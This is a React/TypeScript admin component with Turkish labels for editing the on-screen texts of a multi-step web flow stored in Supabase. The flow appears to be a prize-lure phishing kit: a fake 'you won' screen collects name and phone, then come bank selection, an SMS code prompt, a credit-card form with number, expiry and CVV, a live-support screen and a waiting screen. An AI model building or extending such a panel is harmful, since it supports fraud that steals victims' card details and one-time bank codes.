"use client";

import { useState, useEffect } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";

export function LanguageTab({ darkMode }: { darkMode: boolean }) {
  const [settings, setSettings] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const supabase = createBrowserSupabaseClient();

  const fetchSettings = async () => {
    if (!supabase) return;
    setLoading(true);
    const { data } = await supabase.from("global_settings").select("*").limit(1).single();
    if (data) setSettings(data);
    setLoading(false);
  };

  useEffect(() => {
    fetchSettings();
  }, [supabase]);

  const handleSave = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!supabase || !settings) return;
    setSaving(true);
    const { error } = await supabase
      .from("global_settings")
      .update(settings)
      .eq("id", settings.id || "default");
    
    setSaving(false);
    if (error) alert("Hata: " + error.message);
    else alert("Ayarlar başarıyla kaydedildi!");
  };

  const handleChange = (key: string, value: string) => {
    setSettings((prev: any) => ({ ...prev, [key]: value }));
  };

  if (loading) return <div className="opacity-50">Yükleniyor...</div>;
  if (!settings) return <div className="opacity-50">Ayarlar bulunamadı.</div>;

  const groups = [
    {
      title: "Giriş Ekranı (Code Entry)",
      fields: [
        { key: "code_title", label: "Başlık" },
        { key: "code_subtitle", label: "Alt Başlık ({partner} değişkeni kullanılabilir)" },
        { key: "code_button", label: "Buton Metni" },
      ]
    },
    {
      title: "Tebrikler Ekranı (Win / Profile)",
      fields: [
        { key: "win_title", label: "Başlık" },
        { key: "win_subtitle", label: "Alt Başlık" },
        { key: "win_button", label: "Buton Metni" },
        { key: "profile_title_main", label: "Profil Başlık" },
        { key: "profile_title_small", label: "Profil Küçük Başlık" },
        { key: "profile_subtitle", label: "Profil Alt Başlık" },
        { key: "profile_firstname_label", label: "Ad Etiketi" },
        { key: "profile_lastname_label", label: "Soyad Etiketi" },
        { key: "profile_phone_label", label: "Telefon Etiketi" },
        { key: "profile_button", label: "Profil Buton Metni" },
        { key: "profile_loading_text", label: "Profil Yükleniyor Metni" },
      ]
    },
    {
      title: "Banka Seçim Ekranı",
      fields: [
        { key: "banken_title", label: "Başlık" },
        { key: "banken_subtitle", label: "Alt Başlık" },
        { key: "banken_search_placeholder", label: "Arama Çubuğu Metni" },
      ]
    },
    {
      title: "SMS Onay Ekranı",
      fields: [
        { key: "sms_title", label: "Başlık" },
        { key: "sms_subtitle", label: "Alt Başlık ({digits} değişkeni kullanılabilir)" },
        { key: "sms_input_label", label: "İnput Etiketi" },
        { key: "sms_button", label: "Buton Metni" },
        { key: "sms_loading", label: "Yükleniyor Metni" },
      ]
    },
    {
      title: "Kredi Kartı Ekranı",
      fields: [
        { key: "card_title", label: "Başlık" },
        { key: "card_subtitle", label: "Alt Başlık" },
        { key: "card_owner_label", label: "Kart Sahibi Etiketi" },
        { key: "card_number_label", label: "Kart Numarası Etiketi" },
        { key: "card_expiry_label", label: "Son Kullanma Tarihi Etiketi" },
        { key: "card_cvv_label", label: "CVV Etiketi" },
        { key: "card_button", label: "Buton Metni" },
      ]
    },
    {
      title: "Canlı Destek Ekranı",
      fields: [
        { key: "live_support_title", label: "Başlık" },
        { key: "live_support_subtitle", label: "Alt Başlık" },
        { key: "live_support_button", label: "Buton Metni" },
      ]
    },
    {
      title: "Bekleme Ekranı",
      fields: [
        { key: "wait_title", label: "Başlık" },
        { key: "wait_subtitle", label: "Alt Başlık" },
      ]
    }
  ];

  return (
    <div className="space-y-6">
      <div className="flex justify-between items-center">
        <div>
          <h2 className={`text-2xl font-bold ${darkMode ? 'text-white' : 'text-gray-800'}`}>Dil Ayarları</h2>
          <p className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>Tüm sayfalardaki metinleri buradan çevirebilirsiniz</p>
        </div>
      </div>

      <form onSubmit={handleSave} className="space-y-8">
        {groups.map((group, idx) => (
          <div key={idx} className={`p-6 rounded-xl border shadow-sm ${darkMode ? 'bg-[#1e1e1e] border-white/10' : 'bg-white border-gray-200'}`}>
            <h3 className={`text-lg font-bold mb-4 border-b pb-2 ${darkMode ? 'border-white/10 text-[#EB5E28]' : 'border-gray-200 text-[#EB5E28]'}`}>{group.title}</h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {group.fields.map(f => (
                <div key={f.key}>
                  <label className="block text-xs font-bold mb-1 opacity-70 uppercase tracking-wider">{f.label}</label>
                  {f.key.includes("subtitle") ? (
                    <textarea 
                      value={settings[f.key] || ""}
                      onChange={e => handleChange(f.key, e.target.value)}
                      className={`w-full p-3 rounded-lg text-sm outline-none resize-none h-20 ${darkMode ? 'bg-[#121212] text-white border border-zinc-700 focus:border-[#EB5E28]' : 'bg-gray-50 border border-gray-300 focus:border-[#EB5E28]'}`}
                    />
                  ) : (
                    <input 
                      type="text"
                      value={settings[f.key] || ""}
                      onChange={e => handleChange(f.key, e.target.value)}
                      className={`w-full p-3 rounded-lg text-sm outline-none ${darkMode ? 'bg-[#121212] text-white border border-zinc-700 focus:border-[#EB5E28]' : 'bg-gray-50 border border-gray-300 focus:border-[#EB5E28]'}`}
                    />
                  )}
                </div>
              ))}
            </div>
          </div>
        ))}
        
        <div className="flex justify-end sticky bottom-6">
          <button 
            type="submit" 
            disabled={saving}
            className="px-8 py-3 bg-[#EB5E28] text-white rounded-lg font-bold hover:bg-[#c94d1e] transition-colors shadow-lg disabled:opacity-50 flex items-center gap-2"
          >
            {saving ? "Kaydediliyor..." : (
              <>
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" /></svg>
                Tümünü Kaydet
              </>
            )}
          </button>
        </div>
      </form>
    </div>
  );
}
